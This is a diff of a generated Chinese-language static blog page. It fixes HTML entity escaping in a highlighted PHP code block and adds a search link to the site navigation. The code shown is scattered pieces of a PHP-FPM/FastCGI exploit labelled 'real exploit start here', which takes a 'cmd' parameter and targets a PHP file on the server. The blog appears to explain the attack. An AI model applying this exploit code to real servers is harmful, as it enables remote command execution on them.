+<span class="token comment" spellcheck="true">//        if (!is_array($resp)) {</span>
 <span class="token comment" spellcheck="true">//            throw new Exception('Bad request');</span>
-<span class="token comment" spellcheck="true">//        &amp;#125;</span>
-<span class="token comment" spellcheck="true">//        switch (ord($resp['content']&amp;#123;4&amp;#125;)) &amp;#123;</span>
+<span class="token comment" spellcheck="true">//        }</span>
+<span class="token comment" spellcheck="true">//        switch (ord($resp['content']{4})) {</span>
 <span class="token comment" spellcheck="true">//            case self::CANT_MPX_CONN:</span>
 <span class="token comment" spellcheck="true">//                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');</span>
 <span class="token comment" spellcheck="true">//                break;</span>
@@ -669,20 +671,20 @@ conn<span class="token punctuation">.</span><span class="token function">close</
 <span class="token comment" spellcheck="true">//                break;</span>
 <span class="token comment" spellcheck="true">//            case self::REQUEST_COMPLETE:</span>
 <span class="token comment" spellcheck="true">//                return $response;</span>
-<span class="token comment" spellcheck="true">//        &amp;#125;</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token comment" spellcheck="true">//        }</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
 <span class="token delimiter">?></span>
 <span class="token delimiter">&lt;?php</span>
 <span class="token comment" spellcheck="true">// real exploit start here</span>
-<span class="token comment" spellcheck="true">//if (!isset($_REQUEST['cmd'])) &amp;#123;</span>
+<span class="token comment" spellcheck="true">//if (!isset($_REQUEST['cmd'])) {</span>
 <span class="token comment" spellcheck="true">//    die("Check your input\n");</span>
-<span class="token comment" spellcheck="true">//&amp;#125;</span>
-<span class="token comment" spellcheck="true">//if (!isset($_REQUEST['filepath'])) &amp;#123;</span>
+<span class="token comment" spellcheck="true">//}</span>
+<span class="token comment" spellcheck="true">//if (!isset($_REQUEST['filepath'])) {</span>
 <span class="token comment" spellcheck="true">//    $filepath = __FILE__;</span>
-<span class="token comment" spellcheck="true">//&amp;#125;else&amp;#123;</span>
+<span class="token comment" spellcheck="true">//}else{</span>
 <span class="token comment" spellcheck="true">//    $filepath = $_REQUEST['filepath'];</span>
-<span class="token comment" spellcheck="true">//&amp;#125;</span>
+<span class="token comment" spellcheck="true">//}</span>
  
 <span class="token variable">$filepath</span> <span class="token operator">=</span> <span class="token string">"/var/www/html/add_api.php"</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 文件路径</span>
 <span class="token variable">$req</span> <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -764,6 +766,8 @@ conn<span class="token punctuation">.</span><span class="token function">close</
         
           <li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li>
         
+          <li><a href="/search/">搜索</a></li>
+        
       </ul>
     </div>
 
@@ -829,6 +833,8 @@ conn<span class="token punctuation">.</span><span class="token function">close</
       --><li><a href="/categories/">分类</a></li><!--
     --><!--
       --><li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li><!--
+    --><!--
+      --><li><a href="/search/">搜索</a></li><!--
     -->
       </ul>
       <ul>
